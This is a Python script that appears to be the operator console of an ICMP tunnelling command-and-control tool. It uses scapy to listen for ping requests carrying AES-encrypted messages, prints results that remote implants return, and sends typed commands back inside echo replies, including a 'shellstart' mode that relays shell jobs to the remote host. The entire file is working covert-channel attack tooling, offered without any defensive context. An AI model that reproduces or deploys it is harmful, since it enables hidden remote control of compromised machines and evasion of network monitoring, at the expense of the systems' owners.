#!/usr/bin/env python3

import logging
import base64
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import inputimeout
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

shell_mode = False

def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext.rstrip(b"\0")

def aes_encrypt(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext

def decrypt_message(encoded_message):
    try:
        decoded_data = base64.b64decode(encoded_message).decode('utf-8')
        encrypted_message, key, iv = decoded_data.split("|")
        encrypted_message = b64decode(encrypted_message)
        key = b64decode(key)
        iv = b64decode(iv)
        decrypted_message = aes_decrypt(encrypted_message, key, iv)
        return decrypted_message
    except Exception as e:
        print(f"Error while decrypting message: {e}")
        return None

def encrypt_response(response):
    response_key = get_random_bytes(32)
    response_iv = get_random_bytes(16)
    encrypted_response = aes_encrypt(response.encode("utf-8"), response_key, response_iv)
    message_to_send = (
        b64encode(encrypted_response).decode("utf-8")
        + "|"
        + b64encode(response_key).decode("utf-8")
        + "|"
        + b64encode(response_iv).decode("utf-8")
    )
    return message_to_send

def extract_message(pkt):
    global shell_mode

    if ICMP in pkt and pkt[ICMP].type == 8:  # ICMP Echo Request (ping)
        if Raw in pkt:
            try:
                message = pkt[Raw].load.decode('utf-8')
                decrypted_message = decrypt_message(message)

                if decrypted_message is not None:
                    if decrypted_message.startswith(b"result:"):
                        data = decrypted_message[7:].strip()
                        try:
                            print(decrypted_message.decode("utf-8"))
                            response = "thanks"
                        except Exception as e:
                            print(f"Failed to decode Base64 data: {e}")
                    else:
                        response = process_command(message)

                    if response:
                        message_to_send = encrypt_response(response)
                        send_response(pkt, message_to_send)
                        if not shell_mode:
                            print(f"Sent reply to {pkt[IP].src}: {response}")
            except UnicodeDecodeError:
                print(f"Received message (raw): {pkt[Raw].load.hex()}")

def send_response(pkt, response):
    response = response.encode('utf-8')
    reply_pkt = IP(dst=pkt[IP].src)/ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)/response
    send(reply_pkt, verbose=False)

def process_command(command):
    global shell_mode

    if shell_mode:
        try:
            user_input = inputimeout.inputimeout(prompt='$ ', timeout=9)
            if user_input.strip().lower() == "shellexit":
                shell_mode = False
                print("Shell mode exited.")
                return "shellexit"
        except:
            return "timeout"
        else:
            return "shelljob: " + user_input.strip()
    else:
        try:
            user_input = inputimeout.inputimeout(prompt="Enter the response text to send : ", timeout=9)
            if user_input.strip().lower() == "exit":
                return None
            if user_input.strip().lower() == "shellstart":
                shell_mode = True
                print("Entered shell mode.")
                return "shellstart"
            return user_input
        except:
            return "timeout"

def main():
    try:
        print("Listening for ICMP Echo requests...")
        sniff(filter="icmp", prn=extract_message)
    except KeyboardInterrupt:
        print("\nExiting...")

if __name__ == "__main__":
    main()
